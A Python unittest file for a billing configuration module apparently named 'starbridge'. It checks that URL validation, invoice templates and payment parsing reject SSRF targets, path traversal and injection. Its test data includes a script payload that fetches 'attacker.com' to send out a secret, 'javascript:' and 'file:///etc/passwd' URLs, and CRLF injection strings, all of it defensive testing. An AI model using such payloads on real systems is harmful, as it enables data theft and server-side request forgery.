import socket
from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from starbridge.billing_config import PublicResolver, load_config, parse_payment, validate_config


def provider(base_url="https://billing.example.com/subdir/"):
    return {"enabled": True, "providers": {"demo": {"name": "示例服务商", "base_url": base_url}}}


class BillingConfigTests(unittest.TestCase):
    def test_missing_config_disables_billing_and_loads_beside_main_config(self):
        with TemporaryDirectory() as directory:
            base = Path(directory)
            self.assertEqual(load_config(base), {"enabled": False, "providers": {}})
            (base / "billing.toml").write_text(
                'enabled = true\n[providers.demo]\nname = "示例"\nbase_url = "https://example.com/billing"\n',
                encoding="utf-8",
            )
            self.assertEqual(load_config(base / "config.toml")["providers"]["demo"]["base_url"],
                             "https://example.com/billing")

    def test_normalizes_subdirectory_and_uses_default_timeout_without_mutation(self):
        original = provider()
        config = validate_config(original)
        self.assertEqual(config["timeout"], 15)
        self.assertEqual(config["providers"]["demo"]["base_url"], "https://billing.example.com/subdir")
        self.assertTrue(original["providers"]["demo"]["base_url"].endswith("/"))

    def test_rejects_unknown_fields_types_limits_and_missing_providers(self):
        invalid = [
            {"enabled": True}, {"enabled": "true"}, {"timeout": True}, {"timeout": 4}, {"timeout": 61},
            {"enabled": False, "api_key": "secret"}, {"providers": []},
            {"providers": {f"p{i}": {"name": "x", "base_url": "https://example.com"} for i in range(21)}},
            {"providers": {"bad/name": {"name": "x", "base_url": "https://example.com"}}},
            {"providers": {"demo": {"name": "x", "base_url": "https://example.com", "token": "secret"}}},
        ]
        for config in invalid:
            with self.subTest(config=config), self.assertRaises(ValueError):
                validate_config(config)

    def test_rejects_credentials_private_reserved_and_ambiguous_urls(self):
        invalid = [
            "http://example.com", "https://user:do-not-leak@example.com", "https://localhost",
            "https://localhost.example", "https://foo.local", "https://127.0.0.1", "https://127.1",
            "https://2130706433", "https://0x7f000001", "https://[::1]", "https://[::ffff:127.0.0.1]",
            "https://192.168.1.1", "https://10.0.0.1", "https://169.254.169.254", "https://100.64.0.1",
            "https://192.0.2.1", "https://224.0.0.1", "https://[2001:db8::1]",
            "https://example.com?token=secret", "https://example.com#fragment", "https://example.com/v1/",
            "https://example.com/sub/V1", "https://example.com/../api", "https://example.com/%2e%2e/api",
            "https://example.com\\@127.0.0.1", "https://example_com", "https://example.com:99999",
            "https://example.com\n", "https://example.com./billing",
        ]
        for url in invalid:
            with self.subTest(url=url), self.assertRaises(ValueError) as error:
                validate_config(provider(url))
            self.assertNotIn("do-not-leak", str(error.exception))

    def test_toml_error_does_not_echo_configuration(self):
        with TemporaryDirectory() as directory:
            (Path(directory) / "billing.toml").write_text('base_url = "secret\n', encoding="utf-8")
            with self.assertRaises(ValueError) as error:
                load_config(Path(directory))
            self.assertNotIn("secret", str(error.exception))

    def test_custom_invoice_template_preserves_subdirectory_and_only_explicit_setting(self):
        config = provider("https://example.com/billing")
        self.assertNotIn("invoice_path", validate_config(config)["providers"]["demo"])
        config["providers"]["demo"]["invoice_path"] = "/client/invoice/{invoiceid}?mode=pay"
        normalized = validate_config(config)["providers"]["demo"]
        self.assertEqual(normalized["invoice_path"], "/client/invoice/{invoiceid}?mode=pay")
        for payment_type in ("html", "insert", "unknown"):
            target = parse_payment({"invoiceid": 42, "pay_html": {"type": payment_type, "data": "<script>evil()</script>"}},
                                   normalized["base_url"], normalized["invoice_path"])
            self.assertEqual(target, {"kind": "checkout", "value": "https://example.com/billing/client/invoice/42?mode=pay"})

    def test_invoice_templates_reject_cross_origin_traversal_control_and_extra_placeholders(self):
        invalid = ["https://other.com/{invoiceid}", "//other.com/{invoiceid}", "javascript:evil({invoiceid})",
                   "/invoice", "/{invoiceid}/{invoiceid}", "/{invoiceid}/{other}", "/%7Bother%7D/{invoiceid}",
                   "/../invoice/{invoiceid}", "/%2e%2e/invoice/{invoiceid}", "/%252e%252e/invoice/{invoiceid}",
                   "/%2fother.com/{invoiceid}", "/\\other.com/{invoiceid}", "/invoice/{invoiceid}\r\nsecret",
                   "/invoice/{invoiceid}%0d%0asecret", "/invoice#{invoiceid}"]
        for template in invalid:
            config = provider()
            config["providers"]["demo"]["invoice_path"] = template
            with self.subTest(template=template), self.assertRaises(ValueError):
                validate_config(config)
            with self.subTest(direct=template), self.assertRaises(ValueError):
                parse_payment({"invoiceid": 42}, "https://example.com", template)

    def test_parses_qr_payment_links_and_display_only_image_addresses(self):
        for kind, value, expected in (
            ("url", "weixin://wxpay/bizpayurl?pr=abc123", "qr"),
            ("url", "alipays://platformapi/startapp?saId=10000007&qrcode=test", "qr"),
            ("url", "https://qr.alipay.com/example", "qr"),
            ("jump", "https://example.com/pay?token=abc", "link"),
            ("insert", "https://example.com/qr.png", "image"),
        ):
            with self.subTest(kind=kind, value=value):
                self.assertEqual(parse_payment({"_pay_html": {"type": kind, "data": value}},
                                               "https://example.com/sub"), {"kind": expected, "value": value})

    def test_html_and_insert_snippets_fall_back_without_exposing_or_executing_html(self):
        html = '<script>fetch("https://attacker.com/?secret")</script><img src="http://127.0.0.1/">'
        for kind in ("html", "insert", "unknown"):
            result = parse_payment({"invoiceid": 42, "_pay_html": {"type": kind, "data": html}},
                                   "https://example.com/subdir")
            self.assertEqual(result, {"kind": "checkout", "value": "https://example.com/subdir/viewbilling?id=42"})
            self.assertNotIn("secret", str(result))
        with self.assertRaises(ValueError):
            parse_payment({"invoiceid": "42&redirect=evil", "_pay_html": {"type": "html", "data": html}},
                          "https://example.com")

    def test_rejects_untrusted_payment_addresses(self):
        for kind, value in (
            ("jump", "javascript:alert(1)"), ("jump", "https://user:secret@example.com"),
            ("jump", "http://127.0.0.1/pay"), ("url", "http://169.254.169.254/"),
            ("url", "file:///etc/passwd"), ("url", "weixin://evil/start?x=1"),
            ("url", "alipays://platformapi/startapp?x=1\n[CQ:image,file=secret]"),
            ("insert", "https://192.168.1.1/qr.png"),
        ):
            with self.subTest(kind=kind, value=value), self.assertRaises(ValueError):
                parse_payment({"invoiceid": 42, "_pay_html": {"type": kind, "data": value}},
                              "https://example.com")


class FakeResolver:
    def __init__(self, addresses):
        self.addresses = addresses
        self.calls = []
        self.closed = False

    async def resolve(self, host, port, family):
        self.calls.append((host, port, family))
        return [{"hostname": host, "host": address, "port": port, "family": family,
                 "proto": 0, "flags": 0} for address in self.addresses]

    async def close(self):
        self.closed = True


class PublicResolverTests(unittest.IsolatedAsyncioTestCase):
    async def test_preserves_public_addresses_and_forwards_close(self):
        delegate = FakeResolver(["8.8.8.8", "2606:4700:4700::1111"])
        resolver = PublicResolver(delegate)
        answers = await resolver.resolve("example.com", 443, socket.AF_UNSPEC)
        self.assertEqual([answer["host"] for answer in answers], delegate.addresses)
        self.assertEqual(delegate.calls, [("example.com", 443, socket.AF_UNSPEC)])
        await resolver.close()
        self.assertTrue(delegate.closed)

    async def test_rejects_whole_answer_if_any_address_is_private_or_reserved(self):
        for addresses in (["8.8.8.8", "127.0.0.1"], ["::ffff:10.0.0.1"], ["224.0.0.1"], []):
            with self.subTest(addresses=addresses), self.assertRaises(OSError):
                await PublicResolver(FakeResolver(addresses)).resolve("example.com", 443)

    async def test_each_resolution_is_checked_and_unsafe_hosts_are_not_resolved(self):
        delegate = FakeResolver(["8.8.8.8"])
        resolver = PublicResolver(delegate)
        await resolver.resolve("example.com", 443)
        delegate.addresses = ["10.0.0.1"]
        with self.assertRaises(OSError):
            await resolver.resolve("example.com", 443)
        delegate.calls.clear()
        with self.assertRaises(OSError):
            await resolver.resolve("localhost", 443)
        self.assertEqual(delegate.calls, [])


if __name__ == "__main__":
    unittest.main()
